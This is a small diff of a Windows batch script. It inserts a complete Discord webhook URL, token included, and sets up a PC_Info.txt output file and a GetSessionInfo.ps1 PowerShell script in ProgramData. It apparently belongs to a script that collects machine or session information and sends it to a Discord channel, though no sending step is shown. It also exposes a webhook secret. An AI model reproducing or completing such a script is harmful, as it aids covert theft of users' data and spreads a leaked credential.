@@ -1,7 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 chcp 65001 > nul
-
+https://discord.com/api/webhooks/1208134011780595742/jGrcP2ZMrez9HPluUREQwJctPAMvDNL9ASgVLSbwjwGU62RUR-BIsZMH6caqd7AAxici
 set OutputFile=C:\ProgramData\PC_Info.txt
 set PsScriptFile=C:\ProgramData\GetSessionInfo.ps1
 
